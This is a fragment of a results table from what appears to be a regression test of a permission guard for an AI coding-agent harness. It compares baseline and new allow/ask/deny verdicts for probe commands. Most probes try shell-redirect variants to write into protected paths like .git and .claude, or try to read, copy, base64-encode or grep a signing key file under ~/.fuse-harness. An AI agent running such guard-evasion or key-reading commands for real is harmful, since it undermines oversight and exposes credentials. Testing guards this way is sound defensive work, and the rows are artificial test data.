| X43 | cwd threading | Write md with cwd=/ (non-bash tool) (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| X44 | cwd threading | Edit trivial with cwd=/ (fast path) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| X45 | cwd threading | protected Write with cwd=/ (`<scratch>/proj/.git/zz`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB01 | protected redirect | `(echo x >.claude/apex/zz)` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB02 | protected redirect | `(echo x > .claude/apex/zz)` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB03 | protected redirect | `echo x >.claude/apex/zz)` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB04 | protected redirect | `( ls >.git/zz )` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB05 | protected redirect | `{ echo x >.claude/apex/zz; }` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB06 | protected redirect | `echo $(echo x >.claude/apex/zz)` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB07 | protected redirect | `echo x &>.claude/apex/zz` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| PB08 | protected redirect | `echo x >&.claude/apex/zz` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| PB09 | protected redirect | `echo x >>& .claude/apex/zz` | REPLAY | ask: Bash file write | ask: Bash file write | UNCHANGED |
| PB10 | protected redirect | `echo x >\| .claude/apex/zz` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB11 | protected redirect | `echo x 2>.claude/apex/zz` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB12 | protected redirect | `echo x > ".claude/apex/zz"` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB13 | protected redirect | `(cat a >>.fuse-harness/cache/sessions/s)` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB14 | protected redirect | `ls 2>&1 >.claude/apex/zz` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB15 | protected redirect | `echo x 1>>.git/zz` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| PB90 | protected redirect NEG | `(cat src/a.ts >/dev/null)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| PB91 | protected redirect NEG | `(ls)` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PB92 | protected redirect NEG | `echo x >/dev/null)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| PB93 | protected redirect NEG | `ls >&2` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PB94 | protected redirect NEG | `ls 2>&1` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| PB95 | protected redirect NEG | `(grep x .claude/apex/ >/dev/null)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| PB96 | protected redirect NEG | `cat .claude/apex/x >/dev/null)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| PB97 | protected redirect NEG | `(echo x 2>&1)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| PB98 | protected redirect NEG | `(ls 2>/dev/null)` | REPLAY | allow (no output) | ask: Bash file write | DIFFERENT (Bash-write gate) |
| MK01 | motion key | Write key file (core) (`{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key`, 1 lines) | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| MK02 | motion key | Write key file (motion) (`{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key`, 1 lines) | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK03 | motion key | Edit key file (motion) (`{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key`) | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK04 | motion key | Read key file (motion) (`{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key`) | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK05 | motion key | `cat {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK06 | motion key | `cat ~/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK07 | motion key | `ls {{HOME}}/.fuse-harness/video-motion/keys` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK08 | motion key | `ls -la ~/.fuse-harness` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK09 | motion key | `strings {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK10 | motion key | `cp {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key /tmp/k` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK11 | motion key | `base64 {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK12 | motion key | `find {{HOME}}/.fuse-harness -name '*.key'` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK13 | motion key | `(cat {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key >/dev/null)` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK14 | motion key | `echo x >{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK15 | motion key | `(echo x >{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key)` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK16 | motion key | `mv {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key /tmp/k2` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK17 | motion key | `cat {{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK18 | motion key | `echo x >{{HOME}}/.fuse-harness/video-motion/keys/zz-probe.key` | REPLAY | deny: Protected path | deny: Protected path | UNCHANGED |
| MK19 | motion key | `grep -rn secret {{HOME}}/.fuse-harness` | REPLAY | deny: Motion signing key guard | deny: Motion signing key guard | UNCHANGED |
| MK90 | motion key NEG | `ls ~/.claude` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK91 | motion key NEG | `grep -rn 'api key' docs/` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK92 | motion key NEG | `cat src/a.ts` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK93 | motion key NEG | Write notes.md (motion) (`<scratch>/proj/notes.md`, 1 lines) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK94 | motion key NEG | Read src/a.ts (motion) (`<scratch>/proj/src/a.ts`) | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK95 | motion key NEG | `ls .motion/` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| MK96 | motion key NEG | `echo x >/dev/null)` | REPLAY | allow (no output) | allow (no output) | UNCHANGED |
| RR01 | shell-read-refs | cat ref > /dev/null then Write (credited?) (`<scratch>/proj/src/b.ts`, 1 lines) [6 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| RR02 | shell-read-refs | (cat ref >/dev/null) glued paren (`<scratch>/proj/src/b.ts`, 1 lines) [6 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| RR03 | shell-read-refs | cat ref > file (writes a file: not a pure read) (`<scratch>/proj/src/b.ts`, 1 lines) [6 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| RR04 | shell-read-refs | cat ref \| head (pipe) (`<scratch>/proj/src/b.ts`, 1 lines) [6 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
| RR05 | shell-read-refs | cat ref >&2 (`<scratch>/proj/src/b.ts`, 1 lines) [6 steps] | REPLAY | deny: APEX: read SOLID references for generic | deny: APEX: read SOLID references for generic | UNCHANGED |
